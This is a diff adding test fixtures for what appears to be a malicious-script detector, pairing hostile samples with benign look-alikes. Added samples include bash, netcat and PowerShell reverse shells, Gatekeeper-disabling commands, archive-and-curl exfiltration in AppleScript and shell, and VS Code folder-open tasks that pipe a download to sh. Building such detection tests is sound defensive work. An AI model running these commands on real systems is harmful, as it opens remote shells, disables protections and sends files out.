@@ -181,5 +181,81 @@
     "name": "base64_pipe_perl_e.sh",
     "text": "base64 -d blob.b64 | perl -e 'print length(<STDIN>)'\n",
     "expected": null
+  },
+  {
+    "name": "revshell_devtcp.sh",
+    "text": "#!/bin/bash\nbash -i >& /dev/tcp/192.0.2.10/4444 0>&1\n",
+    "expected": "script_reverse_shell"
+  },
+  {
+    "name": "revshell_fifo.sh",
+    "text": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f\n",
+    "expected": "script_reverse_shell",
+    "container": "zip"
+  },
+  {
+    "name": "revshell_powershell.ps1",
+    "text": "$c=New-Object System.Net.Sockets.TCPClient('192.0.2.10',4444);$s=$c.GetStream();$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)\r\n",
+    "expected": "script_reverse_shell",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "devtcp_port_check.sh",
+    "text": "echo > /dev/tcp/127.0.0.1/22 && echo open\nnc -zv example.invalid 443\n",
+    "expected": null
+  },
+  {
+    "name": "gatekeeper_off.sh",
+    "text": "sudo spctl --master-disable\ndefaults write com.apple.LaunchServices LSQuarantine -bool NO\n",
+    "expected": "macos_gatekeeper_disable"
+  },
+  {
+    "name": "gatekeeper_status.sh",
+    "text": "spctl --status\nspctl --assess --verbose /Applications/Inert.app\n",
+    "expected": null
+  },
+  {
+    "name": "amos_exfil.scpt",
+    "text": "do shell script \"ditto -c -k --sequesterRsrc --keepParent /tmp/12345 /tmp/out.zip\"\ndo shell script \"curl -X POST --form file=@/tmp/out.zip http://192.0.2.10/contact\"\n",
+    "expected": "macos_archive_upload"
+  },
+  {
+    "name": "notarize.sh",
+    "text": "ditto -c -k --keepParent build/Inert.app Inert.zip\nxcrun notarytool submit Inert.zip --wait\n",
+    "expected": null
+  },
+  {
+    "name": "tasks_folderopen_fetch.json",
+    "text": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"setup\",\n      \"type\": \"shell\",\n      \"command\": \"curl -s https://example.invalid/a | sh\",\n      \"runOptions\": { \"runOn\": \"folderOpen\" }\n    }\n  ]\n}\n",
+    "expected": [
+      "dev_vscode_autorun_task",
+      "script_download_execute"
+    ]
+  },
+  {
+    "name": "tasks_folderopen_hidden.json",
+    "text": "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"env\",\"type\":\"shell\",\"command\":\"node .vscode/inert.js\",\n\"presentation\":{\"reveal\":\"never\",\"echo\":false,\"close\":true},\"runOptions\":{\"runOn\":\"folderOpen\"}}]}\n",
+    "expected": "dev_vscode_autorun_task",
+    "container": "zip"
+  },
+  {
+    "name": "tasks_folderopen_watch.json",
+    "text": "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"watch\",\"type\":\"npm\",\"script\":\"watch\",\n\"presentation\":{\"reveal\":\"silent\"},\"runOptions\":{\"runOn\":\"folderOpen\"}}]}\n",
+    "expected": null
+  },
+  {
+    "name": "tasks_folderopen_pretty_args.json",
+    "text": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"init\",\n      \"type\": \"process\",\n      \"command\": \"node\",\n      \"args\": [\n        \"-e\",\n        \"process.exit(0)\"\n      ],\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+    "expected": "dev_vscode_autorun_task"
+  },
+  {
+    "name": "tasks_folderopen_pretty_script.json",
+    "text": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"init\",\n      \"type\": \"process\",\n      \"command\": \"node\",\n      \"args\": [\n        \"build.js\",\n        \"process.exit(0)\"\n      ],\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+    "expected": null
+  },
+  {
+    "name": "amos_exfil_relative.sh",
+    "text": "ditto -c -k --keepParent \"$D\" out.zip\ncurl --data-binary @out.zip https://example.invalid/u\n",
+    "expected": "macos_archive_upload"
   }
 ]
